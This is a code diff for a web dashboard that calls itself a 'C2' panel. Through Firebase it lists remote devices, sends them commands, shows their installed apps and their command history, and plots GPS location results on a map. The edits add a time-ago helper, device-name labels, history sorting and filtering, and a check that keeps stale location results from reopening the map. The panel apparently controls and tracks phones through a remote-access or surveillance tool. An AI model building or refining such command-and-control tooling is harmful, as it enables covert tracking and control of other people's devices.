@@ -629,11 +629,7 @@
                     </div>
                 </div>
             </nav>
-            <div class="sidebar-footer">
-                <a onclick="openSettings()" style="cursor:pointer;color:#6b7280;display:flex;align-items:center;gap:6px;font-size:12px;">
-                    ⚙️ Config
-                </a>
-            </div>
+            <div class="sidebar-footer" style="font-size:11px;color:#3a3f52;">MyControl · C2</div>
         </aside>
 
         <div class="main">
@@ -651,7 +647,6 @@
                         </span>
                         <span id="usernameDisplay" class="username-badge"></span>
                         <button class="btn btn-ghost btn-sm" onclick="refreshDevices()">⟳ Refresh</button>
-                        <button class="btn btn-ghost btn-sm" onclick="openSettings()">⚙️</button>
                         <button class="btn btn-logout btn-sm" onclick="handleLogout()">Sign Out</button>
                     </div>
                 </div>
@@ -1401,7 +1396,7 @@
             state.devices.map(d => {
                 const online = isOnline(d);
                 const short = d.id.slice(0, 8) + '…' + d.id.slice(-6);
-                const lastSeenAgo = d.lastSeen ? Math.floor((Date.now() - d.lastSeen) / 1000) + 's ago' : '—';
+                const lastSeenAgo = timeAgo(d.lastSeen);
                 const hasToken = d.fcmToken ? '🔔 FCM' : '📴 No FCM';
                 return `
                     <div class="device-card ${online ? 'online' : ''}"
@@ -1594,6 +1589,11 @@
         if (!db || !firebaseInitialized) return;
         if (state.resultUnsub) state.resultUnsub();
 
+        // Capture the moment we start listening — any result with a
+        // completedAt/createdAt BEFORE this is considered "old" and
+        // must NOT auto-open the map or re-trigger GPS display.
+        const listenStartedAt = state.deviceSelectedAt || Date.now();
+
         state.resultUnsub = db.collection('results')
             .onSnapshot(snapshot => {
                 snapshot.docChanges().forEach(change => {
@@ -1606,13 +1606,17 @@
                             toast(data.status === 'ok' ? '✓ ' + existing.name : '✗ ' + existing.name,
                                   data.status === 'ok' ? 'success' : 'error');
                         }
-                        if (data.action === 'location_update' || data.action === 'get_location') {
+                        // Only open GPS map for results that arrived AFTER this session started
+                        const resultTs = data.completedAt || data.createdAt || 0;
+                        const isNew = resultTs >= listenStartedAt;
+                        if (isNew && (data.action === 'location_update' || data.action === 'get_location')) {
                             handleLocationResult(data, docId);
                         }
                     }
                     if (change.type === 'modified') {
                         const docId = change.doc.id;
                         const data = change.doc.data();
+                        // Modified results are always new activity — show on map
                         if (data.action === 'location_update' || data.action === 'get_location') {
                             handleLocationResult(data, docId);
                         }
@@ -1968,6 +1972,7 @@
     // ═══════════════════════════════════════════════════════
     function selectDevice(deviceId) {
         state.selectedDeviceId = deviceId;
+        state.deviceSelectedAt = Date.now(); // track when device was selected (blocks old GPS results)
         state.results = [];
         state.commandsSent = 0;
         state.installedApps = [];
@@ -1976,7 +1981,13 @@
         document.getElementById('cmdCountDisplay').textContent = '0';
         document.getElementById('cmdLastStatus').textContent = 'Ready';
         document.getElementById('cmdLastStatus').className = 'value green';
-        document.getElementById('cmdDeviceDisplay').textContent = deviceId.slice(0, 8) + '…' + deviceId.slice(-6);
+
+        // Show device name/model alongside the short ID
+        const dev = state.devices.find(d => d.id === deviceId);
+        const shortId = deviceId.slice(0, 8) + '…' + deviceId.slice(-6);
+        const modelLabel = dev ? (dev.deviceName || dev.name || dev.model || '') : '';
+        document.getElementById('cmdDeviceDisplay').textContent =
+            modelLabel ? modelLabel + '  (' + shortId + ')' : shortId;
         document.getElementById('cmdDeviceDisplay').title = deviceId;
         document.getElementById('cmdHistoryBtn').style.display = 'inline-flex';
 
@@ -2636,22 +2647,22 @@
             '<tr><td colspan="5" style="text-align:center;padding:40px;"><span class="loading-spinner" style="width:18px;height:18px;border-width:2px;vertical-align:middle;margin-right:8px;"></span> Loading history…</td></tr>';
 
         try {
+            // Fetch ALL commands ever sent to this device (no limit), newest first
             const cmdSnap = await db.collection('commands')
                 .where('deviceId', '==', deviceId)
+                .orderBy('createdAt', 'desc')
                 .get();
 
+            // Fetch ALL results in one go and map by command ID
             const resultSnap = await db.collection('results').get();
-
             const resultMap = {};
             resultSnap.forEach(doc => { resultMap[doc.id] = doc.data(); });
 
             const historyItems = [];
-
             cmdSnap.forEach(doc => {
                 const cmdData = doc.data();
                 const cmdId = doc.id;
                 const resultData = resultMap[cmdId];
-
                 historyItems.push({
                     id: cmdId,
                     action: cmdData.action || '?',
@@ -2664,19 +2675,25 @@
             });
 
             state.historyData = historyItems;
-            state.historyFiltered = [...historyItems];
+            state.historyFiltered = [...historyItems]; // already newest-first from query
 
             const actionFilter = document.getElementById('histActionFilter');
             const actions = [...new Set(historyItems.map(h => h.action))].sort();
             actionFilter.innerHTML = '<option value="all">All Actions</option>' +
                 actions.map(a => `<option value="${a}">${a}</option>`).join('');
 
+            // Set sort state to time-descending WITHOUT calling sortHistory()
+            // (calling it would toggle the direction due to its toggle logic)
             state.historySortKey = 'time';
             state.historySortAsc = false;
-            sortHistory('time');
+            // Update arrow UI manually
+            ['time','action','status','output'].forEach(k => {
+                const el = document.getElementById('sortArrow' + k.charAt(0).toUpperCase() + k.slice(1));
+                if (el) el.textContent = k === 'time' ? '▼' : '';
+            });
             renderHistoryTable();
 
-            toast(`📋 Loaded ${historyItems.length} history entries`, 'info');
+            toast(`📋 Loaded ${historyItems.length} total commands`, 'info');
         } catch (e) {
             appendDiag(`❌ History load error: ${e.message}`);
             document.getElementById('historyBody').innerHTML =
@@ -2726,7 +2743,7 @@
         const statusFilter = document.getElementById('histStatusFilter').value;
         const actionFilter = document.getElementById('histActionFilter').value;
 
-        state.historyFiltered = state.historyData.filter(h => {
+        const filtered = state.historyData.filter(h => {
             if (statusFilter !== 'all' && h.status !== statusFilter) return false;
             if (actionFilter !== 'all' && h.action !== actionFilter) return false;
             if (search && !h.output.toLowerCase().includes(search) &&
@@ -2735,6 +2752,18 @@
             return true;
         });
 
+        // Re-apply the current sort after filtering
+        const key = state.historySortKey || 'time';
+        const asc = state.historySortAsc;
+        filtered.sort((a, b) => {
+            let va = key === 'time' ? a.time.getTime() : a[key];
+            let vb = key === 'time' ? b.time.getTime() : b[key];
+            if (va < vb) return asc ? -1 : 1;
+            if (va > vb) return asc ? 1 : -1;
+            return 0;
+        });
+
+        state.historyFiltered = filtered;
         renderHistoryTable();
     }
 
@@ -2824,6 +2853,25 @@
         setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateX(20px)'; el.style.transition = 'all 0.3s'; setTimeout(() => el.remove(), 300); }, 4000);
     }
     function escapeHtml(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+    // ── Human-readable "time ago" (seconds → years) ──
+    function timeAgo(ts) {
+        if (!ts) return '—';
+        const diff = Math.floor((Date.now() - ts) / 1000);
+        if (diff < 5)   return 'just now';
+        if (diff < 60)  return diff + 's ago';
+        const m = Math.floor(diff / 60);
+        if (m < 60)     return m + 'm ago';
+        const h = Math.floor(m / 60);
+        if (h < 24)     return h + 'h ' + (m % 60) + 'm ago';
+        const days = Math.floor(h / 24);
+        if (days < 30)  return days + 'd ' + (h % 24) + 'h ago';
+        const months = Math.floor(days / 30.44);
+        if (months < 12) return months + 'mo ' + (days % 30) + 'd ago';
+        const years = Math.floor(days / 365.25);
+        const remMonths = Math.floor((days % 365.25) / 30.44);
+        return years + 'y ' + remMonths + 'mo ago';
+    }
 </script>
 </body>
 </html>
